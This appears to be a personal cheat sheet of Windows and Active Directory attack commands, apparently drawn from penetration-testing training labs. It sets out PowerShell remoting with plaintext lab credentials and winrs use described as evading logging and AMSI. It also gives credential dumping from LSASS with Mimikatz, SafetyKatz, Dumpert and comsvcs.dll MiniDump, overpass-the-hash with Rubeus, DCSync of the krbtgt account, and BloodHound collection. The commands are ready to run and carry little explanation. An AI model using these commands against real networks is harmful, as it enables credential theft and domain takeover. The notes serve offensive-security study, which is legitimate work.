### PSCredential Object
```powershell
$pass = convertto-securestring 'pass' -AsPlainText -Force
```

```powershell
$creds = New-Object System.Management.Automation.PSCredential('kickass101', $pass)
```


---
### Powershell Remoting
> When you run Enable-PSRemoting, Windows makes several changes to the local Windows configuration:
>
>1. Starts the WinRM service, listening on TCP port 5985
>2. Changes WinRM to start automatically
>3. Makes Windows firewall changes to permit access to TCP port 5985
>4. Configures the WS-Management remote access feature for PowerShell use
>
> Note: PowerShell remoting is accessible only when the Windows Firewall is set to Domain or Private. WinRM is not available for Public network access.

|__One-To-One__|__One-To-Many__|
|-|-|
|Interactive|Non-interactive|
|wsmprovhost|Parallel sessions|
|`New-PSSession` `Enter-PSSession`|`Invoke-Command`|
__New-PSSession__ (WinRM)
```powershell
$pass = ConvertTo-SecureString "transporter@4" -AsPlainText -Force
```

```powershell
 $cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $pass)
```


```powershell
Enter-PSSession -ComputerName localhost -Credential $cred
```

__Invoke-Command__
```powershell
Invoke-Command -ScriptBlock {Get-Process} -ComputerName (Get-Content <list_of_servers>)
```

```powershell
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
```

```powershell
Invoke-Command -ScriptBlock{whoami;hostname} -Session $victim
```
---
### Register-PSSessionConfiguration
```powershell
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
```

- Restart the WinRM service. This will kick us out, so we'll start a new PSSession using the named registered session we set up previously.
```powershell
Restart-Service WinRM
```

```powershell
Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
```

>Note: We cannot use `Register-PSSessionConfiguration` from an evil-winrm shell because we won't be able to get the credentials popup. Furthermore, if we try to run this by first setting up a PSCredential object and then attempting to run the command by passing credentials like `-RunAsCredential $Cred`, we will get an error because we can only use `RunAs` from an elevated PowerShell terminal. Therefore, this method will not work via an evil-winrm session as it requires GUI access and a proper PowerShell console. Furthermore, in our testing, we could not get this method to work from PowerShell on a Parrot or Ubuntu attack host due to certain limitations on how PowerShell on Linux works with Kerberos credentials. This method is still highly effective if we are testing from a Windows attack host and have a set of credentials or compromise a host and can connect via RDP to use it as a "jump host" to mount further attacks against hosts in the environment.

>Other methods such as CredSSP, port forwarding, or injecting into a process running in the context of a target user (sacrificial process)

---
### Winrs
- _Evade logging & AMSI_
- Port: 5985

```powershell
winrs -remote:server1 -u:server1\admin -p:password hostname
```

- winrs.vbs & COM Objects of WSMan Object
---
### Mimikatz
#### Dump Creds
```powershell
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```

```powershell
safetykatz.exe "sekurlsa::ekeys"
```

__rundll32.exe__
```powershell
rundll32.exe C:\Dumpert\Outflank-Dumpert.dll ,Dump
```

```powershell
tasklist \FI "IMAGENAME eq lsass.exe"
```

```powershell
rundll32.exe C:\windows\System32\comsvcs.dll ,MiniDump <lsass pid> C:\Users\Public\lsass.dmp full
```

---
### Over Pass the Hash
>Generates kerberos tickets
```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administartor /domain:example.local /aes256:<aes256Key> /run:powershell.exe"'
```

```powershell
safetykatz.exe '"sekurlsa::pth /user:Administartor /domain:example.local /aes256:<aes256Key> /run:powershell.exe" "exit"'
```

> Above commands starts ps sessions w/ _logon type 9_ same as `runas /netonly`

```powershell
Rubesu.exe asktgt /user:administator /rc4:<ntlmhash> /ptt
```

```powershell
Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

---
### DCSync
>Extract DC creds without code execution

__Require Domain Admin privileges__
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync"' /user:Marvel\krbtgt
```


---
### BloodHound/SharpHound
![[Pasted image 20231207124143.png]]

##### Hide Output
- It generates different `.json` files, then saves them in a `zip` file. It also generates a randomly named file with a `.bin` extension corresponding to the cache of the queries it performs. Defense teams could use these patterns to detect bloodhound.

![[Pasted image 20231207124610.png]]

##### GUI Options
![[Pasted image 20231207131332.png]]

##### Search Bar options
- Group `Group:Domain Admins`
- Domain
- Computer
- User `User:john.doe`
- OU
- GPO
- Container

__Azure search bar options__
- AZApp
- AZRole
- AZDevice
- AZGroup
- AZKeyVault
- AZManagementGroup
- AZResourceGroup
- AZServicePrincipal
- AZSubscription
- AZTenant
- AZUser
- AZVM
